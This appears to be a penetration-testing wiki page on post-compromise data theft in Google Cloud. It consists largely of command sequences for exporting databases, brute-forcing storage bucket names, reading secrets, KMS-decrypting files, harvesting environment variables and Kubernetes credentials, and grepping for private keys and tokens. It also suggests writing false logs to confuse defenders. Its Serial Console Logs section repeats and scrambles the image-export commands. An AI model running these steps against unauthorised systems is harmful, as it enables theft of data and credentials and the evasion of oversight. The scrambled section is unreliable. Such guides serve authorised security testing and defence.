# GCP - Looting

## Databases <a href="accessing-databases" id="accessing-databases"></a>

Google has [a handful of database technologies](https://cloud.google.com/products/databases/) that you may have access to via the default service account or another set of credentials you have compromised thus far.

Databases will usually contain interesting information, so it would be completely recommended to check them. Each database type provides various **`gcloud` commands to export the data**. This typically involves **writing the database to a cloud storage bucket first**, which you can then download. It may be best to use an existing bucket you already have access to, but you can also create your own if you want.

As an example, you can follow [Google's documentation](https://cloud.google.com/sql/docs/mysql/import-export/exporting) to exfiltrate a Cloud SQL database.

* [Cloud SQL](https://cloud.google.com/sdk/gcloud/reference/sql/)
* [Cloud Spanner](https://cloud.google.com/sdk/gcloud/reference/spanner/)
* [Cloud Bigtable](https://cloud.google.com/sdk/gcloud/reference/bigtable/)
* [Cloud Firestore](https://cloud.google.com/sdk/gcloud/reference/firestore/)
* [Firebase](https://cloud.google.com/sdk/gcloud/reference/firebase/)
* There are more databases

```bash
# Cloud SQL
$ gcloud sql instances list
$ gcloud sql databases list --instance [INSTANCE]

# Cloud Spanner
$ gcloud spanner instances list
$ gcloud spanner databases list --instance [INSTANCE]

# Cloud Bigtable
$ gcloud bigtable instances list
```

## Storage Buckets

Default configurations permit read access to storage. This means that you may **enumerate ALL storage buckets in the project**, including **listing** and **accessing** the contents inside.

This can be a MAJOR vector for privilege escalation, as those buckets can contain secrets.

The following commands will help you explore this vector:

```bash
# List all storage buckets in project
gsutil ls

# Get detailed info on all buckets in project
gsutil ls -L

# List contents of a specific bucket (recursive, so careful!)
gsutil ls -r gs://bucket-name/

# Cat the context of a file without copying it locally
gsutil cat gs://bucket-name/folder/object

# Copy an object from the bucket to your local storage for review
gsutil cp gs://bucket-name/folder/object ~/
```

If you get a permission denied error listing buckets you may still have access to the content. So, now that you know about the name convention of the buckets you can generate a list of possible names and try to access them:

```bash
for i in $(cat wordlist.txt); do gsutil ls -r gs://"$i"; done
```

## Crypto Keys

[Cloud Key Management Service](https://cloud.google.com/kms/docs/) is a repository for storing cryptographic keys, such as those used to **encrypt and decrypt sensitive files**. Individual keys are stored in key rings, and granular permissions can be applied at either level.

Having **permissions to list the keys** this is how you can access them:

```bash
# List the global keyrings available
gcloud kms keyrings list --location global

# List the keys inside a keyring
gcloud kms keys list --keyring [KEYRING NAME] --location global

# Decrypt a file using one of your keys
gcloud kms decrypt --ciphertext-file=[INFILE] \
    --plaintext-file=[OUTFILE] \
    --key [KEY] \
    --keyring [KEYRING] \
    --location global
```

## Custom Metadata

Administrators can add [custom metadata](https://cloud.google.com/compute/docs/storing-retrieving-metadata#custom) at the instance and project level. This is simply a way to pass **arbitrary key/value pairs into an instance**, and is commonly used for environment variables and startup/shutdown scripts.

```bash
# view project metadata
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"

# view instance metadata
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"
```

## Serial Console Logs

Compute instances may be **writing output from the OS and BIOS to serial ports**. Serial console logs may expose **sensitive information** from the system logs which low privileged user may not usually see, but with the appropriate IAM permissions you may be able to read them.

You can use the following [gcloud command](https://cloud.google.com/sdk/gcloud/reference/compute/instances/get-serial-port-output) to query the serial port logs:

```
gcloud compute instances get-serial-port-output instance-name \
  --port port \
  --start start \
  --zone zone
```

```
$ gcloud compute images export --image test-image \
    --export-format qcow2 --destination-uri [BUCKET]
```

You can then [export](https://cloud.google.com/sdk/gcloud/reference/compute/images/export) the virtual disks from any image in multiple formats. The following command would export the image `test-image` in qcow2 format, allowing you to download the file and build a VM locally for further investigation:

```
$ gcloud compute images list --no-standard-images
```

## Custom Images <a href="reviewing-custom-images" id="reviewing-custom-images"></a>

**Custom compute images may contain sensitive details **or other vulnerable configurations that you can exploit. You can query the list of non-standard images in a project with the following command:

```
gcloud compute images list --no-standard-images
```

You can then** **[**export**](https://cloud.google.com/sdk/gcloud/reference/compute/images/export)** the virtual disks **from any image in multiple formats. The following command would export the image `test-image` in qcow2 format, allowing you to download the file and build a VM locally for further investigation:

```
gcloud compute images export --image test-image \
    --export-format qcow2 --destination-uri [BUCKET]
```

## Custom Instance Templates

An [instance template](https://cloud.google.com/compute/docs/instance-templates/) defines instance properties to help deploy consistent configurations. These may contain the same types of sensitive data as a running instance's custom metadata. You can use the following commands to investigate:

```bash
# List the available templates
$ gcloud compute instance-templates list

# Get the details of a specific template
$ gcloud compute instance-templates describe [TEMPLATE NAME]
```

## Stackdriver logging

[Stackdriver](https://cloud.google.com/stackdriver/) is Google's general-purpose infrastructure logging suite which might be capturing sensitive information like syslog-like capabilities that report individual commands run inside Compute Instances, HTTP requests sent to load balancers or App Engine applications, network packet metadata for VPC communications, and more.

The service account for a Compute Instance **only needs WRIT**E access to enable logging on instance actions, **but** an administrator may **mistakenly** **grant** the service account both **READ** and WRITE access. If this is the case, you can explore logs for sensitive data.

[gcloud logging](https://cloud.google.com/sdk/gcloud/reference/logging/) provides tools to get this done. First, you'll want to see what types of logs are available in your current project.

```bash
# List logs
gcloud logging logs list
NAME
projects/REDACTED/logs/OSConfigAgent
projects/REDACTED/logs/cloudaudit.googleapis.com%2Factivity
projects/REDACTED/logs/cloudaudit.googleapis.com%2Fsystem_event
projects/REDACTED/logs/bash.history
projects/REDACTED/logs/compute.googleapis.com
projects/REDACTED/logs/compute.googleapis.com%2Factivity_log

# Read logs
gcloud logging read [FOLDER]

# Write logs
# An attacker writing logs may confuse the Blue Team
gcloud logging write [FOLDER] [MESSAGE]
```

## Cloud Functions <a href="reviewing-cloud-functions" id="reviewing-cloud-functions"></a>

Google [Cloud Functions](https://cloud.google.com/functions/) allow you to host code that is executed when an event is triggered, without the requirement to manage a host operating system. These functions can also store environment variables to be used by the code.

```bash
# List functions
gcloud functions list

# Get function config including env variables
gcloud functions describe [FUNCTION NAME]

# Get logs of previous runs
# By default, limits to 10 lines
gcloud functions logs read [FUNCTION NAME] --limit [NUMBER]
```

## App Engine Configurations <a href="reviewing-app-engine-configurations" id="reviewing-app-engine-configurations"></a>

Google [App Engine](https://cloud.google.com/appengine/) is another ["serverless"](https://about.gitlab.com/topics/serverless/) offering for hosting applications, with a focus on scalability. As with Cloud Functions, **there is a chance that the application will rely on secrets that are accessed at run-time via environment variables**. These variables are stored in an `app.yaml` file which can be accessed as follows:

```bash
# First, get a list of all available versions of all services
gcloud app versions list

# Then, get the specific details on a given app
gcloud app describe [APP]
```

## Cloud Run Configurations <a href="reviewing-cloud-run-configurations" id="reviewing-cloud-run-configurations"></a>

Google [Cloud Run](https://cloud.google.com/run) is another serverless offer where you can search for env variables also. Cloud Run creates a small web server, running on port 8080, that sits around waiting for an HTTP GET request. When the request is received, a job is executed and the job log is output via an HTTP response.

The access to this web server might be public of managed via IAM permissions:

```bash
# First get a list of services across the available platforms
gcloud run services list --platform=managed
gcloud run services list --platform=gke

# To learn more, export as JSON and investigate what the services do
gcloud run services list --platform=managed --format=json
gcloud run services list --platform=gke --format=json

# Attempt to trigger a job unauthenticated
curl [URL]

# Attempt to trigger a job with your current gcloud authorization
curl -H \
    "Authorization: Bearer $(gcloud auth print-identity-token)" \
    [URL]
```

## AI platform configurations <a href="reviewing-ai-platform-configurations" id="reviewing-ai-platform-configurations"></a>

Google [AI Platform](https://cloud.google.com/ai-platform/) is another "serverless" offering for machine learning projects.

There are a few areas here you can look for interesting information - models and jobs. Try the following commands.

```
$ gcloud ai-platform models list --format=json
$ gcloud ai-platform jobs list --format=json
```

## Cloud pub/sub <a href="reviewing-cloud-pubsub" id="reviewing-cloud-pubsub"></a>

Google [Cloud Pub/Sub](https://cloud.google.com/pubsub/) is a service that allows independent applications to **send messages** back and forth. Basically, there are **topics** where applications may **subscribe** to send and receive **messages** (which are composed by the message content and some metadata).

```bash
# Get a list of topics in the project
gcloud pubsub topics list

# Get a list of subscriptions across all topics
gcloud pubsub subscriptions list --format=json

# This will retrive a non ACKed message (and won't ACK it)
gcloud pubsub subscriptions pull [SUBSCRIPTION NAME]
```

However, you may have better results [asking for a larger set of data](https://cloud.google.com/pubsub/docs/replay-overview), including older messages. This has some prerequisites and could impact applications, so make sure you really know what you're doing.

## Cloud Git repositories <a href="reviewing-cloud-git-repositories" id="reviewing-cloud-git-repositories"></a>

Google's [Cloud Source Repositories](https://cloud.google.com/source-repositories/) are Git designed to be private storage for source code. You might **find useful secrets here**, or use the **source to discover vulnerabilities** in other applications.

You can explore the available repositories with the following commands:

```bash
# enumerate what's available
gcloud source repos list

# clone a repo locally
gcloud source repos clone [REPO NAME]
```

## Cloud Filestore Instances

Google [Cloud Filestore](https://cloud.google.com/filestore/) is NAS for Compute Instances and Kubernetes Engine instances. You can think of this like any other **shared document repository -** a potential source of sensitive info.

If you find a filestore available in the project, you can **mount it** from within your compromised Compute Instance. Use the following command to see if any exist.

```
gcloud filestore instances list --format=json
```

## Kubernetes

First, you can check to see if any Kubernetes clusters exist in your project.

```
gcloud container clusters list
```

If you do have a cluster, you can have `gcloud` automatically configure your `~/.kube/config` file. This file is used to authenticate you when you use [kubectl](https://kubernetes.io/docs/reference/kubectl/overview/), the native CLI for interacting with K8s clusters. Try this command.

```
gcloud container clusters get-credentials [CLUSTER NAME] --region [REGION]
```

Then, take a look at the `~/.kube/config` file to see the generated credentials. This file will be used to automatically refresh access tokens based on the same identity that your active `gcloud` session is using. This of course requires the correct permissions in place.

Once this is set up, you can try the following command to get the cluster configuration.

```
kubectl cluster-info
```

You can read more about `gcloud` for containers [here](https://cloud.google.com/sdk/gcloud/reference/container/).

## Secrets Management

Google [Secrets Management](https://cloud.google.com/solutions/secrets-management/) is a vault-like solution for storing passwords, API keys, certificates, and other sensitive data. As of this writing, it is currently in beta.

```bash
# First, list the entries
gcloud beta secrets list

# Then, pull the clear-text of any secret
gcloud beta secrets versions access 1 --secret="[SECRET NAME]"
```

Note that changing a secret entry will create a new version, so it's worth changing the `1` in the command above to a `2` and so on.

## Search Local Secrets

```
TARGET_DIR="/path/to/whatever"

# Service account keys
grep -Pzr "(?s){[^{}]*?service_account[^{}]*?private_key.*?}" \
    "$TARGET_DIR"

# Legacy GCP creds
grep -Pzr "(?s){[^{}]*?client_id[^{}]*?client_secret.*?}" \
    "$TARGET_DIR"

# Google API keys
grep -Pr "AIza[a-zA-Z0-9\\-_]{35}" \
    "$TARGET_DIR"

# Google OAuth tokens
grep -Pr "ya29\.[a-zA-Z0-9_-]{100,200}" \
    "$TARGET_DIR"

# Generic SSH keys
grep -Pzr "(?s)-----BEGIN[ A-Z]*?PRIVATE KEY[a-zA-Z0-9/\+=\n-]*?END[ A-Z]*?PRIVATE KEY-----" \
    "$TARGET_DIR"

# Signed storage URLs
grep -Pir "storage.googleapis.com.*?Goog-Signature=[a-f0-9]+" \
    "$TARGET_DIR"

# Signed policy documents in HTML
grep -Pzr '(?s)<form action.*?googleapis.com.*?name="signature" value=".*?">' \
    "$TARGET_DIR"
```

## References

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/#reviewing-stackdriver-logging](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/#reviewing-stackdriver-logging)
